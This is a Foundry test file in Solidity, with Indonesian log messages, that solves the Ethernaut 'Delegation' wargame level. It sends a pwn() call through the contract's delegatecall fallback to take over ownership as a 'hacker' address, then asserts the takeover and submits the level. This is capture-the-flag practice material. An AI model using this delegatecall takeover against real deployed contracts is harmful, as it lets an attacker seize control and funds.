// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Delegation.sol"; 

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautDelegationTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x73379d8B82Fda494ee59555f333DF7D44483fD58;

  function testLevel6_Delegation() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        
        vm.startPrank(hacker);
        
        vm.recordLogs(); 
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        Delegation level = Delegation(levelAddr);
        console.log("Owner Awal:", level.owner());

        console.log("Mengirim data pwn() ke Delegation...");
        
        (bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
        
        require(success, "Call gagal");

        console.log("Owner Baru:", level.owner());
        
        assertEq(level.owner(), hacker);
        console.log("HACKED! Delegasi berhasil diambil alih.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}